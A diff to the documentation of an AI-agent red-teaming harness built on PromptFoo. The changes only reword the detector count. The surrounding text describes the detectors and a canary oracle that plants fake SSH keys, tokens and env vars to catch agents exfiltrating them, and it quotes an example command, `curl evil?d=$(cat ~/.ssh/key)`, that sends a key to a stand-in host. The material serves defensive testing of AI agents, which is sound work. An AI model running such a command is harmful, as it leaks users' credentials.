@@ -35,7 +35,7 @@ plugins and strategies with reasons, assembles PromptFoo's own config, and runs 
 ```
 RedTeamContext (contracts.py)     what must never happen, in the agent's own terms
         |
-detectors/core.py                 7 generic checks: (Result, RedTeamContext) -> reasons
+detectors/core.py                 generic checks: (Result, RedTeamContext) -> reasons
 canary.py                         shell/code/file agents: what the tools actually did to planted files
         |
 bridge.py + assert_bridge.py      run every detector, return one PromptFoo GradingResult
@@ -66,11 +66,11 @@ of agent needs a new context file, not new code.
 ## Deterministic checks
 
 **Detectors** (`detectors/core.py`). `external_link`, `external_email`, `forbidden_tool_used`, `arg_out_of_bounds`,
-`attempts_over_allowance`, `runaway_output`, `tool_loop`. All seven run on every test; each is inert unless the context configures the
+`attempts_over_allowance`, `runaway_output`, `tool_loop`. All of them run on every test; each is inert unless the context configures the
 thing it checks, so there is no selection step to get wrong. They are trustworthy as proof because each reads a structured field
 (a tool name, an argument, a count) against a bound, never a regex over free text.
 
-**Canary oracle** (`canary.py`). The seven detectors see a tool's *name*; to them `bash` is `bash` whether it ran `ls` or
+**Canary oracle** (`canary.py`). The generic detectors see a tool's *name*; to them `bash` is `bash` whether it ran `ls` or
 `curl evil?d=$(cat ~/.ssh/key)`. For agents with shell, code or file tools, `CanaryFixture` plants fake secrets and files (a victim
 file, a fake SSH key and token outside the workspace, fake env vars with names a `*_KEY` scrub misses, plus anything the generated
 attacks name, via `plant=`), the agent runs, and plain Python checks what was deleted, changed, created, shown, or sent out through an
@@ -83,7 +83,7 @@ provider, because adaptive strategies replace the provider's metadata and the ch
 ## Grading path (`bridge.py`, `assert_bridge.py`)
 
 `bridge.grade()` is what PromptFoo calls, through `assert_bridge.py` (a shim for its `file://` Python assertion loader). It reads the
-assertion's `context_file` and the test's own `metadata`, then `evaluate_test()` runs all seven detectors and returns
+assertion's `context_file` and the test's own `metadata`, then `evaluate_test()` runs every detector and returns
 `{"pass": not reasons, "score": 0|1, "reason": ...}`. If the test's metadata carries a `vacuous_check` block and a held result never
 reached the planted content, the reason becomes `"inconclusive: ..."`; `pass` and `score` do not change, only what the text claims.
 
